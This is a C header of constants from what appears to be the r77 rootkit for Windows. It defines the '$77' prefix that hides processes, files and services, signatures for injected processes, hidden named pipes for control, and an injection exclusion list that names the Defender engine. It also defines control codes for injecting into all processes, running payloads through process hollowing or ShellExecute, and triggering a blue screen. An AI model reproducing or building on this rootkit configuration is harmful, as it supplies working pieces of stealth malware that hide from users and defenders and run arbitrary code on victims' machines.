#ifndef _R77DEF_H
#define _R77DEF_H

// These preprocessor definitions must match the constants in R77Const.cs

/// <summary>
/// The prefix for name based hiding (e.g. processes, files, etc...).
/// </summary>
#define HIDE_PREFIX								L"$77"
/// <summary>
/// The length of the hide prefix, excluding the terminating null character.
/// </summary>
#define HIDE_PREFIX_LENGTH						(sizeof(HIDE_PREFIX) / sizeof(WCHAR) - 1)

/// <summary>
/// RK header signature: The process is injected with the RK DLL.
/// </summary>
#define R77_SIGNATURE							0x7277
/// <summary>
/// RK header signature: The process is the RK service process.
/// </summary>
#define R77_SERVICE_SIGNATURE					0x7273
/// <summary>
/// RK header signature: The process is an RK helper file (e.g. TestConsole.exe).
/// </summary>
#define R77_HELPER_SIGNATURE					0x7268

/// <summary>
/// Name for the Windows Service that starts the RK service.
/// </summary>
#define R77_SERVICE_NAME						HIDE_PREFIX L"svc"

/// <summary>
/// Name for the named pipe that notifies the RK service about new child processes.
/// </summary>
#define CHILD_PROCESS_PIPE_NAME					L"\\\\.\\pipe\\" HIDE_PREFIX L"childproc"

/// <summary>
/// Name for the named pipe that receives commands from external processes.
/// </summary>
#define CONTROL_PIPE_NAME						L"\\\\.\\pipe\\" HIDE_PREFIX L"control"

/// <summary>
/// Specifies a list of processes that will not be injected.
/// By default, this list includes processes that are known to cause problems.
/// To customize this list, add custom entries and recompile.
/// </summary>
#define PROCESS_EXCLUSIONS						{ L"MsMpEng.exe", L"MSBuild.exe" }

/// <summary>
/// The control code that terminates the RK service.
/// </summary>
#define CONTROL_R77_TERMINATE_SERVICE			0x1001
/// <summary>
/// The control code that uninstalls RK.
/// </summary>
#define CONTROL_R77_UNINSTALL					0x1002
/// <summary>
/// The control code that temporarily pauses injection of new processes.
/// </summary>
#define CONTROL_R77_PAUSE_INJECTION				0x1003
/// <summary>
/// The control code that resumes injection of new processes.
/// </summary>
#define CONTROL_R77_RESUME_INJECTION			0x1004
/// <summary>
/// The control code that injects RK into a specific process, if it is not yet injected.
/// </summary>
#define CONTROL_PROCESSES_INJECT				0x2001
/// <summary>
/// The control code that injects RK into all processes that are not yet injected.
/// </summary>
#define CONTROL_PROCESSES_INJECT_ALL			0x2002
/// <summary>
/// The control code that detaches RK from a specific process.
/// </summary>
#define CONTROL_PROCESSES_DETACH				0x2003
/// <summary>
/// The control code that detaches RK from all processes.
/// </summary>
#define CONTROL_PROCESSES_DETACH_ALL			0x2004
/// <summary>
/// The control code that executes a file using ShellExecute.
/// </summary>
#define CONTROL_USER_SHELLEXEC					0x3001
/// <summary>
/// The control code that executes an executable using process hollowing.
/// </summary>
#define CONTROL_USER_RUNPE						0x3002
/// <summary>
/// The control code that triggers a BSOD.
/// </summary>
#define CONTROL_SYSTEM_BSOD						0x4001

#endif